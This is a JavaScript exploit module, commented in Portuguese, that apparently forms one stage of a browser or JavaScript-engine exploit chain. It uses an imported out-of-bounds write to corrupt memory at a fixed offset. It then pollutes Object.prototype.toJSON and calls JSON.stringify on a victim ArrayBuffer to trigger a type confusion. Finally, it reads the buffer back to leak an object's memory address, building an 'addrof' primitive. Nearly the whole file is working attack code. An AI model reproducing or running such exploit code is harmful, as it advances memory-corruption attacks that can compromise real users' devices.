// js/script3/testHeisenbugAddrof.mjs

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE = "HeisenbugAddrof_v2";

// --- Constantes para o exploit ---
const CORRUPTION_OFFSET = 0x7C;
const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;
const FILL_PATTERN = 0.123456789101112; // Padrão para verificar se o buffer foi alterado

// --- Variáveis de escopo para a sonda toJSON ---
let victim_ab_ref = null;
let object_to_leak_ref = null;
let heisenbug_confirmed_by_probe = false;

// --- Sonda toJSON para realizar a escrita para addrof ---
function toJSON_Heisenbug_Probe() {
    // Verifica se a confusão de tipo ocorreu
    if (Object.prototype.toString.call(this) === '[object Object]') {
        heisenbug_confirmed_by_probe = true;
        logS3(`[toJSON_Probe] HEISENBUG CONFIRMADA! 'this' é [object Object]. Tentando escrita...`, "vuln");

        // Tenta a escrita que pode vazar o endereço
        try {
            this[0] = object_to_leak_ref;
        } catch (e) {
            logS3(`[toJSON_Probe] Erro ao tentar this[0] = target: ${e.message}`, 'warn');
        }
    }
}

// --- Função Principal do Teste ---
export async function executeHeisenbugAddrofTest() {
    const FNAME_TEST = `${FNAME_MODULE}.execute`;
    logS3(`--- Iniciando ${FNAME_TEST}: Recriando o Heisenbug para Addrof ---`, "test", FNAME_TEST);

    // Resetar estado do teste
    victim_ab_ref = null;
    object_to_leak_ref = { marker: "LeakMe" + Date.now() }; // Objeto alvo
    heisenbug_confirmed_by_probe = false;

    let result = {
        success: false,
        tc_confirmed: false,
        leaked_address: null,
        message: "Teste não iniciado."
    };

    const ppKey = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

    try {
        // PASSO 1: Configurar OOB e corromper memória
        await triggerOOB_primitive({ force_reinit: true });
        logS3(`PASSO 1: Escrevendo valor crítico 0x${CRITICAL_OOB_WRITE_VALUE.toString(16)} no offset ${CORRUPTION_OFFSET.toString(16)}`, 'info', FNAME_TEST);
        oob_write_absolute(CORRUPTION_OFFSET, CRITICAL_OOB_WRITE_VALUE, 4);
        await PAUSE_S3(100);

        // PASSO 2: Criar o ArrayBuffer vítima e a view
        victim_ab_ref = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view = new Float64Array(victim_ab_ref);
        float64_view.fill(FILL_PATTERN);

        // PASSO 3: Poluir protótipo e acionar o bug
        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_Heisenbug_Probe, writable: true, configurable: true, enumerable: false });
        logS3("PASSO 2: Poluído Object.prototype.toJSON. Chamando JSON.stringify no AB vítima...", 'info', FNAME_TEST);

        JSON.stringify(victim_ab_ref);

        // PASSO 4: Analisar o resultado
        logS3("PASSO 3: JSON.stringify concluído. Analisando resultado...", 'info', FNAME_TEST);
        result.tc_confirmed = heisenbug_confirmed_by_probe;

        if (heisenbug_confirmed_by_probe) {
            const value_read_as_double = float64_view[0];
            logS3(`Heisenbug confirmada pela sonda. Valor lido do buffer: ${value_read_as_double}`, "leak");

            if (value_read_as_double === FILL_PATTERN) {
                result.message = "Type Confusion OK, mas o buffer não foi modificado. Addrof falhou.";
                logS3(result.message, 'warn', FNAME_TEST);
            } else {
                const buffer = new ArrayBuffer(8);
                new Float64Array(buffer)[0] = value_read_as_double;
                const int_view = new Uint32Array(buffer);
                const leaked_addr_int64 = new AdvancedInt64(int_view[0], int_view[1]);
                result.leaked_address = leaked_addr_int64.toString(true);
                logS3(`Valor convertido para Int64: ${result.leaked_address}`, 'leak');

                // Verificação simples se o valor parece um ponteiro
                if (leaked_addr_int64.high() > 0 && leaked_addr_int64.high() < 0x7FFF) {
                    result.success = true;
                    result.message = "SUCESSO: Type Confusion e vazamento de ponteiro candidato obtidos!";
                    logS3(result.message, 'vuln', FNAME_TEST);
                } else {
                    result.message = `Type Confusion OK, mas o valor vazado (${result.leaked_address}) não parece um ponteiro válido.`;
                    logS3(result.message, 'warn', FNAME_TEST);
                }
            }
        } else {
            result.message = "FALHA: Type Confusion não foi confirmada pela sonda.";
            logS3(result.message, 'error', FNAME_TEST);
        }

    } catch (e) {
        result.message = `Erro crítico no teste: ${e.message}`;
        logS3(result.message, 'critical', FNAME_TEST);
        console.error(e);
    } finally {
        // Limpeza
        if (originalToJSONDescriptor) {
            Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
        } else {
            delete Object.prototype[ppKey];
        }
        await clearOOBEnvironment();
        logS3("Ambiente limpo e protótipo restaurado.", 'info', FNAME_TEST);
    }

    return result;
}
